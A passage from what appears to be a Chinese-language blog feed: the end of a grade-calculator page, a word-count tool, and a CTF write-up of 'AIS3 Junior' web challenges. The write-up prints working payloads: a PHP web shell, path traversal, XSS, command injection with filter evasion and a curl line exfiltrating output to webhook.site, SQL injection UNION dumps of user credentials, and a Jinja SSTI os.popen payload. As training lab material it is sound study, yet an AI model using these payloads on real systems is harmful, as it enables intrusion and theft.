                const requiredScore3 = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore4, 0.3);
                responseMessage = `第三次段考至少為 ${requiredScore3} 分。`;
            } else if (isNaN(score3) && isNaN(score4) && !isNaN(previousScore)) {
                const requiredScoreThisSemester = calculateRequiredScore(weightedScore1 + weightedScore2, 0.6);
                const requiredScoreBothSemesters = calculateRequiredBothSemesters(weightedScore1 + weightedScore2, 0.6);
                responseMessage = `本學期要通過總分至少為 ${requiredScoreThisSemester*2} 分。\n兩學期皆通過總分至少為 ${requiredScoreBothSemesters*2} 分。`;
            } else if (!isNaN(score3) && !isNaN(score4) && isNaN(previousScore)) {
                responseMessage = totalScore >= 59.5 ? `恭喜本學期通過\n(本學期成績 ${totalScore} 分)` : `本學期未通過\n(本學期成績 ${totalScore} 分)`;
            } else if (!isNaN(score3) && isNaN(score4) && !isNaN(previousScore)) {
                const requiredScore4ThisSemester = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore3, 0.3);
                const requiredScore4BothSemesters = calculateRequiredBothSemesters(weightedScore1 + weightedScore2 + weightedScore3, 0.3);
                responseMessage = `本學期要通過，平時成績至少為 ${requiredScore4ThisSemester} 分。\n兩學期皆通過，平時成績至少為 ${requiredScore4BothSemesters} 分。`;
            } else if (isNaN(score3) && !isNaN(score4) && !isNaN(previousScore)) {
                const requiredScore3ThisSemester = calculateRequiredScore(weightedScore1 + weightedScore2 + weightedScore4, 0.3);
                const requiredScore3BothSemesters = calculateRequiredBothSemesters(weightedScore1 + weightedScore2 + weightedScore4, 0.3);
                responseMessage = `本學期要通過，第三次段考至少為 ${requiredScore3ThisSemester} 分。\n兩學期皆通過，第三次段考至少為 ${requiredScore3BothSemesters} 分。`;
            } else if (!isNaN(score3) && !isNaN(score4) && !isNaN(previousScore)) {
                if ((totalScore + previousScore) >= 119.5) {
                    responseMessage = `恭喜兩學期皆通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                } else if (totalScore >= 59.5) {
                    responseMessage = `僅有本學期通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                } else if (previousScore >= 60) {
                    responseMessage = `僅有上學期通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                } else {
                    responseMessage = `本學期及上學期皆未通過\n(本學期成績 ${totalScore} 分，上學期成績 ${previousScore} 分)`;
                }
            }
            document.getElementById('result').innerText = responseMessage;
        });
    </script>
</body>
</html>

<details class="gray" data-header-exclude><summary><i class="fa-solid fa-chevron-right"></i>成績計算方式及說明 </summary>
              <div class='content'>
              <p class='h4' id="成績計算方式">成績計算方式</h4><p class='h5' id="學期成績計算">學期成績計算</h5><ol><li>第一、二次段考：各佔 20%</li><li>三段、平時成績：各佔 30%</li><li><span class="lightline">學期成績採四捨五入至整數位</span></li></ol><h5 id="學年成績計算">學年成績計算</h5><ol><li>上、下學期成績：各佔 50%</li><li><span class="lightline">學年成績採四捨五入至十分位</span></li></ol><hr><h4 id="輸出內容說明">輸出內容說明</h4><h5 id="若僅輸入第一、二次段考成績">若僅輸入第一、二次段考成績</h5><ol><li>若無上學期成績：輸出本學期通過 第三次段考和平時成績 最低所需的分數。</li><li>若有上學期成績：額外輸出兩學期皆通過 第三次段考和平時成績 最低所需的分數。</li></ol><h5 id="若輸入兩次段考成績及三段或平時成績其中一項">若輸入兩次段考成績及三段或平時成績其中一項</h5><ol><li>若無上學期成績：輸出本學期通過 另一項 最低所需的分數。</li><li>若有上學期成績：額外輸出兩學期皆通過 另一項 最低所需的分數。</li></ol><h5 id="若輸入所有成績">若輸入所有成績</h5><ol><li>若無上學期成績：輸出本學期是否通過。</li><li>若有上學期成績：輸出兩學期通過情況。</li></ol>
              </div>
            </details>]]></content>
      <categories>
        <category>小工具</category>
        <category>成績計算</category>
      </categories>
      <tags>
        <tag>小工具</tag>
        <tag>成績計算</tag>
      </tags>
  </entry>
  <entry>
    <title>文章字數統計</title>
    <url>/words/</url>
    <content><![CDATA[
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background-color: #f9f9f9;
            color: #333;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        .container {
            width: 100%;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .result {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 20px;
            width: 100%;
            padding: 0 20px;
        }

        .group {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            width: 100%;
        }

        .metric-pair {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
        }

        .value {
            min-width: 4ch;
            text-align: right;
            font-weight: bold;
        }

        textarea {
            width: 100%;
            min-height: 150px;
            padding: 12px;
            font-size: 16px;
            border-radius: 6px;
            border: 1px solid #ccc;
            box-sizing: border-box;
            background-color: #fff;
            color: #333;
            margin-bottom: 20px;
        }

        @media (min-width: 601px) {
            .group-triple {
                grid-template-columns: 1fr 1fr 1fr;
            }
        }

        @media (max-width: 600px) {
            .result {
                padding: 0 10px;
                gap: 10px;
            }

            .group, .group-triple {
                grid-template-columns: 1fr 1fr;
                gap: 10px;
            }

            .group-triple .metric-pair:nth-child(3) {
                grid-column: auto;
            }

            .group-triple:last-child {
                display: grid;
                grid-template-areas: 
                    "space punct"
                    "emoji emoji";
            }

            .metric-pair {
                margin: 0;
            }
        }

        body.dark-mode {
            background-color: #1e1e1e;
            color: #e0e0e0;
        }

        body.dark-mode textarea {
            background-color: #333333;
            color: #e0e0e0;
            border: 1px solid #444;
        }
    </style>
</head>
<body>
    <hr>
    <div class="container">
        <textarea id="textInput" placeholder="請輸入內容..." oninput="analyzeText()"></textarea>
        
        <div class="result">
            <div class="group">
                <div class="metric-pair">
                    <span>文章字數</span>
                    <span id="charCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>總字元數</span>
                    <span id="weightedCharCount" class="value">0</span>
                </div>
            </div>
            
            <div class="group">
                <div class="metric-pair">
                    <span>文字段落</span>
                    <span id="lineCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>總單字數</span>
                    <span id="englishWordCount" class="value">0</span>
                </div>
            </div>
            
            <div class="group group-triple">
                <div class="metric-pair">
                    <span>中文字數</span>
                    <span id="chineseCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>英文字數</span>
                    <span id="englishCharCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>數字數量</span>
                    <span id="numberCount" class="value">0</span>
                </div>
            </div>
            
            <div class="group group-triple">
                <div class="metric-pair">
                    <span>空格數量</span>
                    <span id="spaceCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>標點符號</span>
                    <span id="punctCount" class="value">0</span>
                </div>
                <div class="metric-pair">
                    <span>Emoji🙂</span>
                    <span id="emojiCount" class="value">0</span>
                </div>
            </div>
        </div>
    </div>
    <script data-swup-reload-script type="text/javascript">
        function analyzeText() {
            const text = document.getElementById('textInput').value;

            const lineCount = text.split(/\r?\n/).filter(line => line.trim().length > 0).length;
            const chineseCount = (text.match(/[\u4e00-\u9fff]/g) || []).length;
            const englishWordCount = (text.match(/[a-zA-Z]+(?:[-'][a-zA-Z]+)*/g) || []).length;
            const englishCharCount = (text.match(/[a-zA-Z]/g) || []).length;
            const numberCount = (text.match(/\d/g) || []).length;
            const emojiMatches = (text.match(/[\uD83C-\uDBFF\uDC00-\uDFFF]/g) || []);
            const emojiCount = Math.floor(emojiMatches.length / 2);
            const punctCount = (text.match(/[^\w\s\u4e00-\u9fff\d]/g) || []).filter(char => !/[\uD83C-\uDBFF\uDC00-\uDFFF]/.test(char)).length;
            const spaceCount = (text.match(/\s/g) || []).length;

            const totalCharCount = chineseCount + englishCharCount + numberCount + punctCount + emojiCount + spaceCount;
            const weightedCharCount = (chineseCount * 3) + (englishCharCount * 1) + (numberCount * 1) + (punctCount * 1) + (emojiCount * 2) + (spaceCount * 1);

            document.getElementById('charCount').textContent = formatNumber(totalCharCount);
            document.getElementById('weightedCharCount').textContent = formatNumber(weightedCharCount);
            document.getElementById('lineCount').textContent = formatNumber(lineCount);
            document.getElementById('englishWordCount').textContent = formatNumber(englishWordCount);
            document.getElementById('chineseCount').textContent = formatNumber(chineseCount);
            document.getElementById('englishCharCount').textContent = formatNumber(englishCharCount);
            document.getElementById('punctCount').textContent = formatNumber(punctCount);
            document.getElementById('emojiCount').textContent = formatNumber(emojiCount);
            document.getElementById('numberCount').textContent = formatNumber(numberCount);
            document.getElementById('spaceCount').textContent = formatNumber(spaceCount);
        }

        function formatNumber(num) {
            if (num === 0) {
                return '0';
            }
            return num.toString().replace(/^0+/, ''); 
        }
        window.onload = analyzeText;
    </script>
</body>
</html>
]]></content>
      <categories>
        <category>小工具</category>
        <category>字數統計</category>
      </categories>
      <tags>
        <tag>小工具</tag>
        <tag>字數統計</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 Junior writeup</title>
    <url>/AIS3-Junior-writeup/</url>
    <content><![CDATA[<h2 id="01-Broken-Access-Control">01 - Broken Access Control</h2>
<h3 id="BAC-01">BAC 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>進入網頁後，有個輸入框問你是誰 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small default">
    <p>隨便輸入幾個名字，發現都是進入 <code>user</code> 這個路徑，並輸出 <code>Welcome {name}！</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>嘗試更改路徑到 <code>admin</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{FirstBROKENAccessControl;)}</code></p>

  </div>
<h3 id="BAC-02">BAC 02</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>進入網頁後，可以看出他是個購物網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small default">
    <p>將商品一一點開，發現他們都是在 <code>product</code> 目錄下，並依序為第 <code>1</code>、<code>2</code>、<code>3</code>、<code>5</code>、<code>6</code>項 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>更改網址，看看沒擺出來的 <code>編號4商品</code><br>
結果竟然是在賣 FLAG，而且還不用錢！ <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-3.png"
                      alt="image"
                > <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC02-4.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{BroJustFoundBabyIDORVulnerability}</code></p>

  </div>
<h3 id="BAC-03">BAC 03</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>類似 BAC01 的頁面，不過前面的方法對它沒用 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC03-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>嘗試利用 Burpsuite 攔截封包，結果發現程式碼內有 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/BAC03-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{BabyBRokenAccEssControoooooool}</code></p>

  </div>
<h2 id="02-File-Upload">02 - File Upload</h2>
<h3 id="FIL-01">FIL 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>一個可以上傳東西的網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small default">
    <p>甚至可以上傳包含 <code>&lt;?php system($_GET['cmd']);?&gt;</code> 的 web shell <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>上傳完成後，進入 <code>url/uploads/c3644_108.160.138.201.php</code><br>
在網址後方接上 <code>?cmd={command}</code> ，其中 <code>{command}</code> 可以插入任意指令</p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p><code>ls</code> 發現這層目錄好像沒甚麼東西，<br>
到前一層目錄看看 (<code>{command}</code>=<code>ls%20../</code>)<br>
發現 FLAG 並印出 (<code>{command}</code>=<code>cat%20../FLAG</code>)</p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{FirstWEBSHELLXDDD}</code></p>

  </div>
<h3 id="FIL-02">FIL 02</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>與上一題類似的網頁，但它似乎不給上傳 php 檔 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>將檔案類型改為 <code>image/jpg</code>，並送出修改過的封包內容<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>檔案上傳後，使用與前面一樣的方法，進入 <code>url/uploads/c3644_108.160.138.201.php</code>。結果發現前一層目錄中也有 FLAG 存在，將其印出即可得到答案<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/FIL02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{BabyUploadBypass}</code></p>

  </div>
<h2 id="03-Local-File-Inclusion">03 - Local File Inclusion</h2>
<h3 id="LFI-01">LFI 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>一個登錄系統和一張貓咪圖片 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small default">
    <p>該圖片網址為 <code>url/include.php?GetType=file_get_contents&amp;file=static/bitcoinCat.jpg</code> ，可以判斷這張圖片是透過 php 存取的</p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>透過 php 偽協議 <code>php://filter/read=convert.base64-encode/resource=index.php</code>，可以將 <code>index.php</code> 的內容以 base64 編碼的方式讀取，解碼後即可還原出完整原始碼</p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>發現管理員 帳號: <code>admin</code> 、 密碼: <code>CATLOVEBITCOINMEOWMEOW</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>登入管理員帳號後，即可得到 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{php://filter/BabyPHPLFI.b64decode()}</code></p>

  </div>
<h3 id="LFI-02">LFI 02</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>檔案上傳後，存在 <code>/tmp/c3644_108.160.138.201.php</code> 中 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>先回到根目錄後並嘗試進入該目錄 <code>url/post.php?form=/../../../../../../tmp/c3644_108.160.138.201.php</code></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>接上指令 <code>&amp;cmd=ls</code>，查看目錄中檔案 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small danger">
    <p>使用 <code>&amp;cmd={command}</code>，而非  <code>?cmd={command}</code> 原因是前面已使用過 <code>.php?form=</code>，而我們還需要再接上額外指令，所以將其它的指令用 <code>&amp;</code> 連接</p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>接上指令 <code>&amp;cmd=cat%20S3Cr3TFLAGGGGG</code>，查看 <code>S3Cr3TFLAGGGGG</code> 內容 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/LFI02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{../../../../tmp/BADBAD.php?LFI=SUCCESS}</code></p>

  </div>
<h2 id="04-Cross-Site-Scripting">04 - Cross-Site Scripting</h2>
<h3 id="XSS-01">XSS 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>這個系統會問你是誰 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/XSS01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>發現原始碼中有 FLAG 這個變數 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/XSS01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>在輸入框中，輸入 <code>&lt;script&gt;alert(FLAG)&lt;/script&gt;</code> 即可取得 FLAG</p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{XSSXSSXSSXSS}</code></p>

  </div>
<h2 id="05-Command-Injection">05 - Command Injection</h2>
<h3 id="CMD-01">CMD 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>這個網頁可以確認 IP 狀態 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>在輸入的 IP 後接上指令。如 <code>;ls -al</code>，顯示如下 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>看看 FLAG 裡面存著甚麼 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD01-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{BabyCommand;InjectionXDDDddddd}</code></p>

  </div>
<h3 id="CMD-02">CMD 02</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>這與上一題類似的網站 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>嘗試使用一樣的指令，但 <code>ls</code> 似乎被加進黑名單了 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>不過沒關係，我們可以利用 Spilt Evasion，將 <code>ls</code> 寫成 <code>l$()s</code>，插入後發現指令可以執行了！</p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>輸入 <code>;c$()at FLAG</code>，取得 FLAG 的內容 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{niceWordBL$()ACKListEvasion;)}</code></p>

  </div>
<h3 id="CMD-03">CMD 03</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>與前兩題類似，但 <code>分號</code>、<code>空格</code> 等字元似乎被加進黑名單過濾了</p>

  </div>

  <div class="note p-4 mb-4 rounded-small danger">
    <p>不過沒關係，我們可以透過 Blacklist Evasion 繞過黑名單過濾機制。</p>

  </div>
<table>
<thead>
<tr>
<th style="text-align:center">逃脫方法</th>
<th style="text-align:center">原始字元</th>
<th style="text-align:center">逃脫方式</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>Spilt Evasion</strong></td>
<td style="text-align:center"><code>cat</code></td>
<td style="text-align:center"><code>c$()at</code></td>
</tr>
<tr>
<td style="text-align:center"><strong>Bash Operator</strong></td>
<td style="text-align:center"><code>;</code></td>
<td style="text-align:center"><code>|</code></td>
</tr>
<tr>
<td style="text-align:center"><strong>Space Evasion</strong></td>
<td style="text-align:center"><code>空格</code></td>
<td style="text-align:center"><code>$&#123;IFS&#125;</code></td>
</tr>
</tbody>
</table>

  <div class="note p-4 mb-4 rounded-small info">
    <p>將 <code>;cat FLAG</code> 改為輸入 <code>|c$()at${IFS}FLAG</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD03-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{BashOperato|rEvasion${IFS}SUCC|ESSFUL|:DDDDD}</code></p>

  </div>
<h3 id="CMD-04">CMD 04</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>雖然與前面幾題長很像，但先前的指令對這題沒用 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD04-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small default">
    <p>束手無策，只好試試看用 webhook 能不能撈到些資訊</p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>透過curl 將數據傳至 webhook，並利用前面手法繞過驗證<br>
<code>|cu$()rl${IFS}-X${IFS}POST${IFS}https://webhook.site/your_UUID${IFS}-d${IFS}out$()put=$(l$()s)</code><br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD04-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p><code>ls</code> 後，發現裡面有 <code>ERRORCMDi_FLAG</code> 檔案<br>
將 <code>ls</code> 改為 <code>cat ERRORCMDi_FLAG</code>，即可得到 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD04-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{E${IFS}RRORB3sed|$(CMDi)Succ3ss:DD}</code></p>

  </div>
<h3 id="CMD-05">CMD 05</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>與前一題類似，一樣先 <code>ls</code> 將資料夾檔案列出 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD05-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>同上題，將 <code>ls</code> 改為 <code>cat BLindCMDiFLAG</code>後，即可得到 FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD05-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{BROJust|curl%20-d%20$(l3akTheDATAT0outSideXDD)}</code></p>

  </div>
<h3 id="CMD-06">CMD 06</h3>

  <div class="note p-4 mb-4 rounded-small info">
    <p>同上題，輸入 <code>|c$()at${IFS}FLAG</code> 即可取得FLAG <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/CMD06-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{ouo_hihi}</code></p>

  </div>
<h2 id="06-SQL-Injection">06 - SQL Injection</h2>
<h3 id="SQL-01">SQL 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>一個登入系統 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>在帳號欄位填入 <code>admin' or 1==1 -- #</code> ，將帳號設為 <code>admin</code> 並將後面判斷註解掉 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{SQL'InjectionXDorD=D_--_-}</code></p>

  </div>
<h3 id="SQL-02">SQL 02</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>一個有輸入框的頁面 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small default">
    <p>隨意輸入後，會進到此頁面 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>可以使用 <code>UNION SELECT (num) #</code> 來測試查詢的有效欄位數，當 (num) 填入 <code>1</code>、<code>1,2</code>、<code>1,2,3</code> 時，系統都報錯了。<br>
而填入 <code>1,2,3,4</code> 時不再報錯，說明這個資料庫的查詢需要匹配四個欄位！<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-3.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>使用 <code>UNION SELECT</code> 搭配 <code>group_concat(schema_name)</code> 從 information_schema.schemata 中獲取所有資料庫名稱，<br>
<code>' UNION SELECT 1,group_concat(schema_name),3,4 from information_schema.schemata #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-4.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>選定 ApexPredators 資料庫後，使用 <code>UNION SELECT</code> 及 <code>group_concat(table_name)</code> 從 information_schema.tables 中查詢該資料庫的所有表格名稱。<br>
<code>' UNION SELECT 1,group_concat(table_name),3,4 from information_schema.tables WHERE table_schema='ApexPredators' #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-5.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>確認表格後，我對 ApexPredators 資料庫中的 user 表格進行查詢，利用 WHERE table_name 篩選表格及查詢欄位名稱<br>
<code>' UNION SELECT 1,group_concat(column_name),3,4 from information_schema.columns WHERE table_schema='ApexPredators' AND table_name='users' #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-6.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>鎖定 ApexPredators.users 欄位，使用 <code>UNION SELECT 1,username,isAdmin,password</code> 提取帳號、密碼及是否為管理員等重要資訊<br>
<code>' UNION SELECT 1,username,isAdmin,password FROM ApexPredators.users #</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-7.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>從提取的資料中發現用戶 KubenBlisk 是管理員，使用該帳號密碼後成功登入系統即可取得 FLAG<br>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-8.png"
                      alt="image"
                > <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/SQL02-9.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small success">
    <p><code>AIS3_Junior{_BRO-DO_A--UNION_SELECTXDDD_--_-}</code></p>

  </div>
<h2 id="07-Server-Side-Template-Injection">07 - Server-Side Template Injection</h2>
<h3 id="STI-01">STI 01</h3>

  <div class="note p-4 mb-4 rounded-small default">
    <p>有一個輸入框，輸入 <code>1+1</code> 會回傳2。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI01-1.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>利用<a class="link"   href="https://github.com/HHousen/hack-the-box/blob/master/Challenges/Web/Templated/README.md" >在網路上找到的payload<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br>
<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read()</code> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/AIS3-Junior-writeup/STI01-2.png"
                      alt="image"
                ></p>

  </div>

  <div class="note p-4 mb-4 rounded-small info">
    <p>裡面有個 FLAG 檔案，我們可以稍微修改 payload，讓它印出 FLAG 內容<br>
<code>self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat FLAG').read()</code> <img  
                     lazyload
